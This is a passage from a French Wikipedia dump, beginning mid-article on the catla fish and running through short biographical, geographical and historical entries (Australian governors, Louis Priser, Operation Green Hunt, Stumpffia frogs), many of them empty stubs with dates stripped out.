C'est un omnivore qui se nourrit essentiellement en surface. Jeunes et adultes se nourrissant d'insectes aquatiques et terrestres, de détritus, de diatomées et de phytoplancton.
Reproduction.
Les adultes se reproduisent en rivière, le frai se déroulant entre début décembre et mi-février.
Économie.
La Catla est une espèce importante dans l'économie mondiale : avec 3 286 274 tonnes produites en 2019, elle tenait le rang parmi les animaux aquatiques les plus fréquemment élevés en aquaculture dans le monde.
Elle est récoltée en pêcheries (très grande importance commerciale dans ce domaine) et en aquaculture (importance commerciale assez grande). Elle est aussi considérée comme un poisson de sport de pêche.
En aquaculture elle est souvent associée à d'autres poissons : soit pour un élevage tri-partite des trois principales carpes indiennes avec le rohu ("Labeo rohita") et le mrigal ("Cirrhinus mrigala"), soit dans un mélange de 6 espèces de carpes en ajoutant la carpe commune ("Cyprinus carpio"), la carpe de roseau ("Ctenopharyngodon idellus") et la carpe argentée ("Hypophthalmichthys molitrix").
Sa chair goûteuse est plutôt bien considérée.
Santé.
Depuis le début des années 2000 l'Europe s'est préoccupée du « syndrome ulcératif épizootique », une infection par un champignon de la sous-classe des Oomycètes, "Aphanomyces invadans", portée par certains poissons dont la catla. Dans le cadre du code aquatique, l'OIE a posé des recommandations de sanitation strictes dans son rapport en 2006 sur le sujet. 
Le syndrome ulcératif épizootique est listé parmi les dangers sanitaires de catégorie pour les espèces animales.
En 2010 la catla a été interdite à l'importation au Canada – avec 234 autres espèces de poissons à nageoires pour éviter la contagion du Syndrome ulcéreux endémique (Epizootic Ulcerative Syndrome – EUS). En France ce sont 350 espèces de poissons, dont la catla, qui sont concernées par les mesures sanitaires prises au niveau européen.
En 2012 l'OMS a publié un rapport de 180 pages sur l'utilisation des eaux usées, excréta humains et eaux ménagères comme alimentation des poissons dans les piscicultures. Les excreta humains non traités ont traditionnellement été utilisés dans plusieurs pays de l'est, du sud et du sud-est asiatique (Bengladesh, Vietnam, Indonésie et notamment en Chine) pour la production de végétaux et d'animaux aquatiques – dont la catla. Cette pratique intentionnelle diminue, mais l'utilisation involontaire d'excréta humains augmente dans certaines régions, en particulier dans les zones des grandes villes – ceci dû à une forte urbanisation qui amène une pollution des eaux de surface, à l'intensification d'une aquaculture à haut niveau d'intrants et à la raréfaction de l'eau douce dans plusieurs pays.

</doc>
<doc id="9412387" url="https://fr.wikipedia.org/wiki?curid=9412387" title="Chambre de commerce de Québec">
Chambre de commerce de Québec



</doc>
<doc id="9412389" url="https://fr.wikipedia.org/wiki?curid=9412389" title="James McGirr">
James McGirr

James McGirr, né le à Parkes et mort le à Sydney, est un homme politique australien premier ministre de la Nouvelle-Galles du Sud du au .

</doc>
<doc id="9412391" url="https://fr.wikipedia.org/wiki?curid=9412391" title="John Northcott">
John Northcott

John Northcott, né le à Creswick et mort le à Sydney, est un homme politique australien gouverneur de Nouvelle-Galles du Sud du au .

</doc>
<doc id="9412392" url="https://fr.wikipedia.org/wiki?curid=9412392" title="Arthur Roden Cutler">
Arthur Roden Cutler



</doc>
<doc id="9412394" url="https://fr.wikipedia.org/wiki?curid=9412394" title="Tom Murphy">
Tom Murphy



</doc>
<doc id="9412398" url="https://fr.wikipedia.org/wiki?curid=9412398" title="James Rowland">
James Rowland

James Rowland, né le à Armidale et mort le à Sydney, est un homme politique australien gouverneur de Nouvelle-Galles du Sud du au .

</doc>
<doc id="9412399" url="https://fr.wikipedia.org/wiki?curid=9412399" title="Leporarium">
Leporarium

Un (du latin ', « lièvre ») est un parc à lièvres dans l'Antiquité romaine. C'est un cas particulier des ' que l'on trouvait à partir de la fin de l'époque républicaine autour des grandes "villa". Le lièvre était un animal particulièrement apprécié dans la gastronomie romaine, le meilleur gibier selon Martial.
Description.
Dans les ', on gardait non seulement des lièvres, mais des lapins de garenne. Les ' sont les ancêtres des garennes qu'on trouve à partir du Moyen Âge et qui étaient un privilège de la noblesse.
La terminologie a varié selon les époques : Varron, au , distingue, parmi les dépendances des "villae" où l'on garde des animaux, les "ornithones" , les "leporaria" et les "piscinae" . À chacun de ces lieux correspond une spécialité professionnelle : oiseleurs, chasseurs et pêcheurs. On voit que la distinction s'appuie en gros sur la différence d’habitat : air, terre, eau. Les "leporaria" sont de vastes enclos ceints de murs. Mais Varron précise qu'aux générations antérieures les "leporaria" n'étaient que des parcs à lièvres. Au , Aulu-Gelle rappelle le texte de Varron et ajoute : ; il indique que les parcs à gibier étaient appelés anciennement "roboraria" (à cause des palissades en chêne qui entouraient ces parcs) et que, de son temps, ils sont qualifiés de "vivaria".

</doc>
<doc id="9412400" url="https://fr.wikipedia.org/wiki?curid=9412400" title="David Martin (gouverneur)">
David Martin (gouverneur)

David Martin, né le à Sydney et mort le dans la même ville, est un homme politique australien, gouverneur de Nouvelle-Galles du Sud du au .

</doc>
<doc id="9412401" url="https://fr.wikipedia.org/wiki?curid=9412401" title="George Slight">
George Slight

George Henry Slight Marshall, né le à Édimbourg (Écosse) et mort le à Santiago (Chili), est un ingénieur civil écossais spécialisé dans la construction des phares.
En 1892, il fut contacté par le gouvernement du président du Chili Jorge Montt afin d’effectuer la conception et la construction d’un ensemble de phares situés sur les côtes chiliennes. Il est connu pour la construction de sept phares installés dans le détroit de Magellan ainsi que le phare Cabo Raper dans le golfe de Penas.

</doc>
<doc id="9412402" url="https://fr.wikipedia.org/wiki?curid=9412402" title="Peter Ross Sinclair">
Peter Ross Sinclair

Peter Ross Sinclair, né le à Manly, est un homme politique australien, gouverneur de Nouvelle-Galles du Sud du au .

</doc>
<doc id="9412403" url="https://fr.wikipedia.org/wiki?curid=9412403" title="George Henry Slight Marshall">
George Henry Slight Marshall



</doc>
<doc id="9412404" url="https://fr.wikipedia.org/wiki?curid=9412404" title="Tom Murphy (baseball, 1991)">
Tom Murphy (baseball, 1991)

Thomas James Murphy (né le à West Monroe, New York, États-Unis) est un receveur des Mariners de Seattle de la Ligue majeure de baseball.
Carrière.
Joueur des Bulls de l'université d'État de New York à Buffalo, Tom Murphy est repêché par les Rockies du Colorado au de sélection en 2012. Il débute dès 2012 en ligues mineures avec un club affilié aux Rockies et gradue au niveau Triple-A en cours de saison 2015.
Il remporte une médaille d'argent avec les États-Unis aux Jeux panaméricains de 2015 à Toronto.
Murphy fait ses débuts dans le baseball majeur le avec les Rockies du Colorado face aux Mariners de Seattle.

</doc>
<doc id="9412408" url="https://fr.wikipedia.org/wiki?curid=9412408" title="Gordon Samuels">
Gordon Samuels

Gordon Samuels, né le à Londres et mort le à Sydney, est un homme politique australo-britannique, gouverneur de Nouvelle-Galles du Sud du au .

</doc>
<doc id="9412410" url="https://fr.wikipedia.org/wiki?curid=9412410" title="David Hurley">
David Hurley

David Hurley, né le à Wollongong (Nouvelle-Galles du Sud), est un général et homme d'État australien. Gouverneur de Nouvelle-Galles du Sud du au , il est gouverneur général d'Australie du au .
Biographie.
Jeunesse et études.
David John Hurley est le fils de Norma et James Hurley. Son père est métallurgiste dans l'Illawarra et sa mère travaille dans une épicerie. David Hurley grandit à Port Kembla et fréquente le lycée de la ville, où il obtient son diplôme d'études supérieures en 1971. Il obtient ensuite un baccalauréat ès arts et un diplôme d'études supérieures en études de défense au collège militaire royal de Duntroon.
Famille.
David Hurley est marié à Linda (née McMartin) et a trois enfants.
Officier militaire.
David Hurley exerce la fonction de commandant en chef des Forces armées du au , concluant une carrière militaire longue de . Il est notamment déployé durant l'opération Solace en Somalie en 1993, avant de devenir commandant de la Première brigade de l'Armée australienne de 1999 à 2000. Il est "Chief Capability Development Group" de 2003 à 2007, puis "Chief of Joint Operations" jusqu'en 2008. Il est vice-commandant en chef des Forces armées du au .
Gouverneur de Nouvelle-Galles du Sud.
Le , le Premier ministre de Nouvelle-Galles du Sud, Mike Baird, annonce qu'il compte proposer la nomination de David Hurley au poste de gouverneur de l'État, représentant de la reine . David Hurley entre en fonction le suivant.
Gouverneur général d'Australie.
Le , le Premier ministre d'Australie, Scott Morrison, fait savoir qu'il proposera à la reine le nom de David Hurley pour succéder à Sir Peter Cosgrove en tant que gouverneur général d'Australie. Il prête serment le , devenant la à exercer cette fonction. Sam Mostyn lui succède en 2024.

</doc>
<doc id="9412413" url="https://fr.wikipedia.org/wiki?curid=9412413" title="Elías Díaz">
Elías Díaz

Elías David Díaz Soto (né le à Maracaibo, Zulia, Venezuela) est un receveur des Rockies du Colorado de la Ligue majeure de baseball.
Carrière.
Elías Díaz signe son premier contrat professionnel avec les Pirates de Pittsburgh le 7 novembre 2008. Il débute en ligues mineures avec le club affilié des Pirates au Venezuela en 2009, puis rejoint un premier club-école aux États-Unis en 2010. 
Díaz se démarque d'abord par son jeu défensif, principalement la force de ses lancers sur les buts pour retirer les coureurs adverses en tentative de vol, mais il émerge comme une menace en offensive et comme un joueur d'avenir à surveiller pour Pittsburgh à partir de son passage en 2014 avec le club-école de niveau Double-A des Pirates, lorsqu'il frappe pour une moyenne au bâton de ,328 en 91 matchs du Curve d'Altoona. Ces performances lui valent une promotion au niveau Triple-A chez les Indians d'Indianapolis, où il est assigné dès le début de la saison 2015. Le 12 juillet 2015, il joue le match des étoiles du futur à Cincinnati.
Elías Díaz fait ses débuts dans le baseball majeur le 12 septembre 2015 comme frappeur suppléant des Pirates de Pittsburgh face aux Brewers de Milwaukee.

</doc>
<doc id="9412414" url="https://fr.wikipedia.org/wiki?curid=9412414" title="École internationale de Boston">
École internationale de Boston



</doc>
<doc id="9412417" url="https://fr.wikipedia.org/wiki?curid=9412417" title="Lycée International de Boston">
Lycée International de Boston



</doc>
<doc id="9412418" url="https://fr.wikipedia.org/wiki?curid=9412418" title="École bilingue de Boston">
École bilingue de Boston



</doc>
<doc id="9412419" url="https://fr.wikipedia.org/wiki?curid=9412419" title="Ecole bilingue de Boston">
Ecole bilingue de Boston



</doc>
<doc id="9412420" url="https://fr.wikipedia.org/wiki?curid=9412420" title="French-American International School of Boston">
French-American International School of Boston



</doc>
<doc id="9412421" url="https://fr.wikipedia.org/wiki?curid=9412421" title="French American International School of Boston">
French American International School of Boston



</doc>
<doc id="9412422" url="https://fr.wikipedia.org/wiki?curid=9412422" title="The French-American International School of Boston">
The French-American International School of Boston



</doc>
<doc id="9412423" url="https://fr.wikipedia.org/wiki?curid=9412423" title="The French American International School of Boston">
The French American International School of Boston



</doc>
<doc id="9412424" url="https://fr.wikipedia.org/wiki?curid=9412424" title="William Frederick Herschel">
William Frederick Herschel



</doc>
<doc id="9412425" url="https://fr.wikipedia.org/wiki?curid=9412425" title="Ecole Bilingue of Boston">
Ecole Bilingue of Boston



</doc>
<doc id="9412426" url="https://fr.wikipedia.org/wiki?curid=9412426" title="The Ecole Bilingue of Boston">
The Ecole Bilingue of Boston



</doc>
<doc id="9412427" url="https://fr.wikipedia.org/wiki?curid=9412427" title="Jean Sgard">
Jean Sgard

Jean Joseph Rémy Sgard, né le à Paris, est un universitaire français.
Biographie.
Agrégé de Lettres en 1953, docteur en Lettres en 1968, Jean Sgard est professeur émérite de l’université Stendhal-Grenoble 3. Spécialiste du , il a travaillé notamment sur l’abbé Prévost, sur lequel il a publié plusieurs ouvrages, et dont il a publié deux biographies et édité les œuvres complètes aux Éditions littéraires et linguistiques de l'université de Grenoble. Il est aussi l'éditeur de Crébillon fils et de plusieurs autres auteurs du . On lui doit plusieurs travaux sur la presse au siècle des Lumières et de nombreuses réflexions quant au fondement des recherches sur cette période.
Il est président d'honneur de la Société française d'étude du dix-huitième siècle.
Rendant compte de "Vie de Prévost (1697-1763)" (2006), Alan J. Singerman écrit que Jean Sgard est « le chef de file et le maître à penser des spécialistes de Prévost depuis la publication de sa grande thèse, "Prévost romancier" en 1968. Il n'a pas arrêté, au fil des années, d'approfondir l'étude de l'œuvre prévostienne, toujours avec la même perspicacité, la même exactitude scrupuleuse et un sens critique hors pair. » Du "Dictionnaire des journaux. 1600-1789" (1991), Roland Desné note que « Cet ouvrage fondamental est appelé à servir de référence pour longtemps. »

</doc>
<doc id="9412429" url="https://fr.wikipedia.org/wiki?curid=9412429" title="Gare de Bergslagsbanans">
Gare de Bergslagsbanans

La gare de Bergslagsbanans est une gare ferroviaire suédoise historique, située à Göteborg dans le Comté de Västra Götaland. 
Situation ferroviaire.
Cette gare servait les trains de Västkustbanan vers l'ouest du pays .
Histoire.
Elle a été conçue par les frères Axel Kumlien et Hjalmar Kumlien en 1881. La gare s'ouvre progressivement à la circulation de 1875 à 1879.
La gare est construite par la "Bergslagernas Järnvägar" (Chemin de fer Bergslagen, BJ). La crête de la BJ se trouve au-dessus de l'entrée droite de la gare; elle symbolise la ferronnerie et était la marque de la compagnie de chemin de fer. 
Patrimoine ferroviaire.
Selon la RAA: "La gare Bergslagsleden de Göteborg est à la fois le terminus et un symbole impressionnant du plus grand investissement ferroviaire privée de la Suède, (les Bergslagsbanan ou Bergslagsleden, Les chemins de fer (BJ)) en affaires entre les années 1872-1879 (...) La construction du bâtiment a été un projet massif avec des murs porteurs extérieurs et des parois internes de briques. (...) L'extérieur est plâtré avec un retrait lumineux de couleur ornée et de l'ornementation moulée." .
La gare est divisée en les salles d'attente (pour les voyageurs de , 2e et 3e) et un restaurant. Une modification en 1906 a changé le trajets des escaliers principaux à l'intérieur. Le système des corridors (qui se trouvait à l'origine directement à l'intérieur de la façade principale et menant à la salle d'attente de troisième classe) a reçu en 1913 une contrepartie sur la face opposée de l'édifice. La billetterie sera aussi poussée plus loin dans la pièce. Depuis 1930, lorsque les services de passagers ont été transférés à la gare centrale de Göteborg, le bâtiment contenait des bureaux. Plus tard, elle sera utilisée pour d'autres activités.
Une rénovation totale du bâtiment en 2001 a remis la menuiserie, la fonte de fer, le stuc, des portes, des miroirs et d'autres items caractéristiques à un style plus original. Le hall d'entrée, l'escalier principal et quelques autres plus petites parties du bâtiment ont été reconstruits selon une conception plus ancienne ou originale de l'édifice.

</doc>
<doc id="9412441" url="https://fr.wikipedia.org/wiki?curid=9412441" title="Louis Priser">
Louis Priser

Louis Priser (1913-2009), est un instituteur, un écrivain et un journaliste français dont la langue maternelle est le breton léonard.
Contemporain et ami du cornouaillais Pierre-Jakez Hélias, il témoigne notamment, à travers ses récits autobiographiques, de la vie rurale et pauvre de la Basse-Bretagne d'avant guerre,
Biographie.
Enfance.
Louis Priser nait à Penzé, en Taulé, dans la ferme familiale de Meaz Curunec. Son père, aidé de deux domestiques, s'occupe de ses cinq vaches et de son champ de blé. De plus, il se loue, avec ses trois chevaux tirant deux charrettes, à la minoterie Borgnis-Desbordes comme livreur des boulangeries de la région de Saint Pol et de Morlaix. Sa mère, Françoise Guiader, est la fille d'une aubergiste de Penzé et d'un « tueur de porcs » (lac'her moc'h), métier alors ambulant qui requérait d'opérer également les castrations.
Lorsque son père est mobilisé, Louis Priser est séparé de sa fratrie, sa sœur Marie, née en 1904, son aîné Charles, Albert, né un an après lui, et est élevé avec ses cousines jusqu'à l'âge de sept ans par sa tante, aubergiste qui tient dans le bas de Penzé une épicerie faisant office de café. C'est un milieu bretonnant mais plus ouvert à la langue française, qui s'impose aux enfants, lesquels, du moins la grande majorité qui se considère comme appartenant à la paysannerie, n'utilisent que le breton entre eux.
Il retrouve en 1920 le monde paysan de ses parents, qui déménagent l'année suivante, à la naissance d'un petit Yves, de quelques centaines de mètres, à la ferme de Kersiroux. Le choc qu'a été ce retour à la vie rude d'un autre âge fera l'objet de son premier récit autobiographique, "Une poignée d'ajoncs". C'est dans ce milieu, malgré tout aimant mais baigné de superstitions, qu'il reçoit son éducation, en français, l'emploi du breton à la maison ayant été interdit par l'instituteur, au point que la langue qu'utilisent entre eux ses parents lui reste étrangère.
La crise morale de l'adolescence.
Les excès de l'ordre moral rigoriste fondé sur la brimade et l'obsession du péché, dans lequel il est élevé tant à l'école qu'au catéchisme, le conduisent dès les débuts de l'adolescence à rejeter l'Église et se tourner vers une sorte de panthéisme personnel nourri par la contemplation de la nature.
En 1925, ses résultats au certificat d'études lui valent d'être admis, avec un an d'avance, à l'école primaire supérieure de Morlaix, où il réussit le concours qui le fait boursier. Grâce à cette bourse, il poursuit ses études jusqu'au baccalauréat au lycée de Morlaix.
À l'âge de quinze ans, la découverte de la théorie de l'évolution, les lectures de Zola, Vallès, Hugo le confortent dans le rejet du monde religieux dont il est issu, et l'amène à rêver d'une utopie politique égalitaire. La crise morale et familiale qu'il vit alors est profonde. Dans le Pays de Léon où la réussite sociale passe par le séminaire de Saint-Pol-de-Léon, il est rejeté par les siens comme mécréant ( "difeiz").
Après une expérience d'alcoolisation, il renonce au projet d'arrêter ses études et se faire Johnny, mais son désir d'évasion se traduit par une première escapade suicidaire en mer. Il découvre la navigation en travaillant l'été sur un des cotres dragueurs de sable coquillier ( "traez"), matériau d'amendement dont le port de Penzé est spécialiste.
Instituteur.
En 1930, à l'âge de dix-sept ans, il choisit de devenir instituteur et est admis l'École normale primaire de Quimper. Il effectue son premier stage l'année suivante à l'île-de-Batz. C'est là qu'il est nommé au terme des trois années de formation, en 1934. Il y défend l'école laïque dans un monde où sa fréquentation expose encore à l'excommunication et y poursuit sa carrière pendant cinq ans, jusqu'à la guerre. C'est sur cette île qu'il devient l'ami de Georges Delaselle.
De l'automne 1939 à l'été 1940, il est mobilisé dans un régiment de dragons.
En 1941, il est nommé à l'école de garçons d'Huelgoat, rue des Cieux, qui comprend un internat, bien moindre que celui de l'école des filles. Durant l'Occupation, son engagement républicain le conduit, comme beaucoup de soldats démobilisés que la drôle de guerre a déroutés, à entrer dans la Résistance, dont l'un des plus grands maquis bretons, organisé dès 1941 par les FTP de l'ex-conseiller municipal communiste Fernand Jacq, se trouve dans la forêt d'Huelgoat et dont le réseau Sibiril organise des exfiltrations par mer.
En 1945, il est un des premiers à organiser une colonie de vacances. Il crée avec quatre amis une association huelgoataine, "L'Amicale laïque". L'association achète une ancienne auberge de jeunesse sur l'Ile-de-Batz au lieu-dit Kerabandu. Il y anime, avec l'aide des habitants, une classe de mer où les enfants d'Huelgoat apprennent à nager et à ramer, la "colonie du Phare", retrouvant chaque été l'île, vers laquelle, adolescent, il rêvait de s'évader.
Écrivain.
Passionné de photographie, il devient dans les années 1960 correspondant local de presse du "Télégramme". Pendant quarante ans, il alimentera la chronique locale d'Huelgoat, et celle de Batz, où il a une résidence secondaire. Ses pages vacances, consacrées à la pêche côtière et illustrées de photographies originales, ont un grand succès.
En 1982, à l'âge de soixante-neuf ans, dans sa maison de Toul ar Hoat, entre la ville et la forêt d'Huelgoat, il entreprend la rédaction de ses souvenirs. Il publie l'année suivante chez Jos Le Doaré deux brochures, des contes et des souvenirs. La réunion de certains de ces derniers dans un récit consacré à l'enfance et à son village natal, Penzé, est publiée 1984 à Paris, "Une poignée d'ajoncs", qui reçoit le prix décerné chaque année par la revue "La Vie". Suivra trois ans plus tard le récit autobiographique de la libération personnelle et morale qu'a été sa rencontre avec la mer, à Île-de-Batz, "Une brassée de goëmon".
Cette même année 1987, le pêcheur Louis Priser collabore avec le chef cuisinier Patrick Jeffroy à un ouvrage sur les "Plaisirs du bord de mer". Les auteurs reçoivent l'année suivante de l'Association des écrivains bretons le Prix de la Fédération des Bretons de Paris.
En 1995, il publie les photographies d'écoles des années passées à Huelgoat et des étés à Batz. Il les enrichit d'anecdotes, "Le Temps des jonquilles".
Louis Priser meurt le à la maison de retraite d'Huelgoat et, conformément à son souhait, son corps est incinéré.

</doc>
<doc id="9412442" url="https://fr.wikipedia.org/wiki?curid=9412442" title="Charles Hudon">
Charles Hudon



</doc>
<doc id="9412445" url="https://fr.wikipedia.org/wiki?curid=9412445" title="Operation Green Hunt">
Operation Green Hunt

Operation Green Hunt était le nom utilisé par les médias indiens pour nommer la grande et longue offensive des forces paramilitaires du Gouvernement indien et des forces de la police d'état contre les Naxalites. L'opération aurait commencé en novembre 2009 dans cinq États du « Corridor rouge ».
Planification et mise en œuvre.
En , la Central Reserve Police Force (CRPF) a annoncé qu'elle était dans l'étape final de la planification de l'offensive et avait reçu l'approbation du gouvernement. Le Commando Battalion for Resolute Action (CoBRA) prendra la tête des opérations contre les insurgés maoïstes.
Au début de , la première phase de l'opération a commencé dans le District de Gadchiroli. Jusqu'à 18 compagnies des forces paramilitaires centrales ont été déplacées dans la zone (en prévision de l'opération.
L'opération a été, au moins à ses débuts, très meurtrière pour la population civile. Une quarantaine de villageois seraient tués chaque semaine par des milices pro-gouvernementales, ce qui conduit le gouvernement à dissoudre certaines d'entre elles.
Réponse des maoïstes.
En réponse à l'offensive, les insurgés ont lancé plusieurs attaques de grande ampleur contre les forces de sécurité indiennes :
Contestation.
Les intellectuels indiens, traditionnellement plutôt hostiles aux méthodes de la guérilla et à son projet politique, ont pour beaucoup condamné cette offensive en raison des atteintes aux libertés individuelles (notamment en matière de liberté d'expression et de libre-circulation des personnes) et aux droits de l'homme qu'elle impliquait.
Sumanta Banerjee, historien du naxalisme, indique : « Nous sommes arrivés à un point où les intellectuels indiens ne peuvent pas rester neutres. Même s’ils ne sont pas d’accord avec la tactique des maoïstes, ils doivent s’opposer aux politiques d’industrialisation prédatrices menées par le gouvernement, qui conduisent à confisquer des hectares de terres fertiles, à détruire des rivières et à faire fuir des milliers de villageois de leur lieu de vie. »
Cette mobilisation a en particulier abouti à un jugement de la Cour suprême déclarant anticonstitutionnel le recours aux special police officers.

</doc>
<doc id="9412446" url="https://fr.wikipedia.org/wiki?curid=9412446" title="L’Amazonie">
L’Amazonie



</doc>
<doc id="9412451" url="https://fr.wikipedia.org/wiki?curid=9412451" title="Centre interdisciplinaire de recherche sur l'opérationnalisation du développement durable">
Centre interdisciplinaire de recherche sur l'opérationnalisation du développement durable



</doc>
<doc id="9412452" url="https://fr.wikipedia.org/wiki?curid=9412452" title="Susanne Sachße">
Susanne Sachße

Susanne Sachße est une productrice, réalisatrice, scénariste et actrice allemande.
Biographie.
Au "Premio Maguey", Susanne Sachße est nommée "Icône Queer 2017".

</doc>
<doc id="9412453" url="https://fr.wikipedia.org/wiki?curid=9412453" title="Susanne Sachse">
Susanne Sachse



</doc>
<doc id="9412454" url="https://fr.wikipedia.org/wiki?curid=9412454" title="Susanne Sachsse">
Susanne Sachsse



</doc>
<doc id="9412481" url="https://fr.wikipedia.org/wiki?curid=9412481" title="Jitamitra Malla">
Jitamitra Malla

Jitamitra Malla () (1663–1696) est un membre de la dynastie des Malla, il est roi de Bhaktapur, au Népal, de 1673 à 1696. Fils de Jagat Prakasha Malla, il est remarquable par son activité de bâtisseur. En 1674, il fait construire un temple dédié à Shiva dans le style Shikhara. En 1682, il fait bâtir sur la place Durbar, place royale, le palais Dharmasala, le palais aux 55 fenêtres, que son fils achèvera. Ce palais sera utilisé par la royauté jusqu'en 1769. Aujourd'hui il a été transformé en musée et fait partie, comme le reste de la place Durbar de Bhaktapur, des sites protégés au titre du patrimoine mondial de l'humanité par l'UNESCO. 

</doc>
<doc id="9412496" url="https://fr.wikipedia.org/wiki?curid=9412496" title="Hôtel de Monfrand">
Hôtel de Monfrand

L’hôtel de Monfrand ou encore hôtel de Sèze et de Monfrand ou encore Rousseau de Monfrand est un hôtel particulier situé à Laval, dans le département de la Mayenne. L'hôtel est situé 21, 23, 25 rue du Hameau à Laval, sur le chemin qui conduisait le plus rapidement à Château-Gontier.
Histoire.
Il appartient à l’origine à une famille de négociants de Laval, les Duchemin, puis passe ensuite à la famille Rousseau de Monfrand.
Lors de la Révolution française, l'hôtel sert d’asile au général Louis de Salgues de Lescure lors du passage de l'Armée catholique et royale de Vendée en 1793. Soigné par son chirurgien Louis-Jean-Baptiste-Étienne Baguenier Desormeaux, il y salue, malgré sa blessure, l’armée vendéenne, qui défile sous sa fenêtre durant quatre heures.
L'hôtel devient ensuite la résidence de Nicolas Harmand, premier préfet de la Mayenne.
La demeure appartient à un moment au Vicomte d'Aboville. Ce dernier fait inscrire sur une plaque en marbre : "Ancien hôtel de Monfrand ici Le Général vendéen Louis-Marie de Lescure mortellement blessé a été soigné du au ".
Ce bâtiment fait l’objet d’une inscription au titre des monuments historiques depuis le , inscription confirmée par l'arrêté du .

</doc>
<doc id="9412508" url="https://fr.wikipedia.org/wiki?curid=9412508" title="Aragarças">
Aragarças

Aragarças est une municipalité brésilienne de l'État de Goiás et la microrégion d'Aragarças.

</doc>
<doc id="9412522" url="https://fr.wikipedia.org/wiki?curid=9412522" title="Emilio de la Forest de Divonne">
Emilio de la Forest de Divonne



</doc>
<doc id="9412547" url="https://fr.wikipedia.org/wiki?curid=9412547" title="Hugo tout seul">
Hugo tout seul



</doc>
<doc id="9412551" url="https://fr.wikipedia.org/wiki?curid=9412551" title="Hugo Tout Seul">
Hugo Tout Seul



</doc>
<doc id="9412552" url="https://fr.wikipedia.org/wiki?curid=9412552" title="Arenópolis">
Arenópolis

Arenópolis est une municipalité brésilienne de l'État de Goiás et la microrégion d'Aragarças.

</doc>
<doc id="9412591" url="https://fr.wikipedia.org/wiki?curid=9412591" title="Charles Bigelow">
Charles Bigelow

Charles A. Bigelow, né en à Détroit est un créateur de caractères américain, historien de la typographie et professeur. 
Il est notamment réputé pour sa création, avec son associée Kris Holmes, des polices de caractères Lucida et Wingdings qui sont notamment utilisées par les produits Apple.
De à il a été professeur de typographie à l’université Stanford. Il a présidé le comité de recherche et d’enseignement de l’Association typographique internationale ; à ce titre, il a organisé le premier séminaire consacré à la typographie numérique. Intitulé "" (en français « Création de caractères avec l’ordinateur et la main »), il s’est tenu à Stanford en .
Caractères.
Bigelow a dessiné ou participé à la création des polices de caractères suivantes :

</doc>
<doc id="9412594" url="https://fr.wikipedia.org/wiki?curid=9412594" title="Gertrude Berg">
Gertrude Berg

Gertrude Berg est une actrice et scénariste américaine née le à New York et morte le dans la même ville. 
Biographie.
Gertrude Berg est née à New York sous le nom de Tilly Edelstein à East Harlem d'un père russe et d'une mère anglaise ; elle habitait à Lexington Avenue. Elle se marie avec Lewis Berg en 1918 ; ils auront deux enfants.
Berg a commencé sa carrière à la radio. En 1929, elle commence un feuilleton radiophonique intitulé "The Rise of the Goldbergs", et est identifiée à la série "The Goldbergs".
En 1959, elle remporte un Tony Award au théâtre pour la pièce "A Majority of One" de Leonard Spigelgass, et apparaît dans plusieurs feuilletons télévisés.
Elle meurt d'une crise cardiaque à Manhattan en 1966.

</doc>
<doc id="9412603" url="https://fr.wikipedia.org/wiki?curid=9412603" title="Norbert Növényi">
Norbert Növényi

Norbert Növényi est un lutteur hongrois spécialiste de la lutte gréco-romaine né le à Budapest.
Biographie.
Norbert Növényi participe aux Jeux olympiques d'été de 1980 à Moscou dans la catégorie des poids mi-lourds et remporte la médaille d'or.

</doc>
<doc id="9412606" url="https://fr.wikipedia.org/wiki?curid=9412606" title="Kim Nam-joon">
Kim Nam-joon



</doc>
<doc id="9412607" url="https://fr.wikipedia.org/wiki?curid=9412607" title="Baliza">
Baliza

Baliza est une municipalité brésilienne de l'État de Goiás et la microrégion d'Aragarças.

</doc>
<doc id="9412624" url="https://fr.wikipedia.org/wiki?curid=9412624" title="Bom Jardim de Goiás">
Bom Jardim de Goiás

Bom Jardim de Goiás est une municipalité brésilienne de l'État de Goiás et la microrégion d'Aragarças.

</doc>
<doc id="9412637" url="https://fr.wikipedia.org/wiki?curid=9412637" title="Liverion">
Liverion



</doc>
<doc id="9412640" url="https://fr.wikipedia.org/wiki?curid=9412640" title="Diorama (Goiás)">
Diorama (Goiás)

Diorama est une municipalité brésilienne de l'État de Goiás et la microrégion d'Aragarças.

</doc>
<doc id="9412645" url="https://fr.wikipedia.org/wiki?curid=9412645" title="Stumpffia analamaina">
Stumpffia analamaina



</doc>
<doc id="9412647" url="https://fr.wikipedia.org/wiki?curid=9412647" title="Stumpffia be">
Stumpffia be



</doc>
<doc id="9412648" url="https://fr.wikipedia.org/wiki?curid=9412648" title="Stumpffia gimmeli">
Stumpffia gimmeli



</doc>
<doc id="9412649" url="https://fr.wikipedia.org/wiki?curid=9412649" title="Stumpffia grandis">
Stumpffia grandis



</doc>
<doc id="9412650" url="https://fr.wikipedia.org/wiki?curid=9412650" title="Stumpffia hara">
Stumpffia hara



</doc>
<doc id="9412651" url="https://fr.wikipedia.org/wiki?curid=9412651" title="Stumpffia helenae">
Stumpffia helenae



</doc>
<doc id="9412652" url="https://fr.wikipedia.org/wiki?curid=9412652" title="Stumpffia kibomena">
Stumpffia kibomena



</doc>
<doc id="9412653" url="https://fr.wikipedia.org/wiki?curid=9412653" title="Stumpffia madagascariensis">
Stumpffia madagascariensis



</doc>
<doc id="9412654" url="https://fr.wikipedia.org/wiki?curid=9412654" title="Stumpffia megsoni">
Stumpffia megsoni



</doc>
<doc id="9412655" url="https://fr.wikipedia.org/wiki?curid=9412655" title="Stumpffia miery">
Stumpffia miery



</doc>
<doc id="9412656" url="https://fr.wikipedia.org/wiki?curid=9412656" title="Stumpffia psologlossa">
Stumpffia psologlossa



</doc>
<doc id="9412657" url="https://fr.wikipedia.org/wiki?curid=9412657" title="Stumpffia pygmaea">
Stumpffia pygmaea



</doc>
<doc id="9412658" url="https://fr.wikipedia.org/wiki?curid=9412658" title="Stumpffia roseifemoralis">
Stumpffia roseifemoralis



</doc>
<doc id="9412659" url="https://fr.wikipedia.org/wiki?curid=9412659" title="Stumpffia staffordi">
Stumpffia staffordi



</doc>
<doc id="9412660" url="https://fr.wikipedia.org/wiki?curid=9412660" title="Stumpffia tetradactyla">
Stumpffia tetradactyla



</doc>
<doc id="9412661" url="https://fr.wikipedia.org/wiki?curid=9412661" title="Stumpffia tridactyla">
Stumpffia tridactyla



</doc>
<doc id="9412664" url="https://fr.wikipedia.org/wiki?curid=9412664" title="Andy Andreoff">
Andy Andreoff

&lt;dfn&gt;Andy Andreoff&lt;/dfn&gt; (né le à Pickering, en Ontario au Canada) est un joueur professionnel canadien de hockey sur glace.
Biographie.
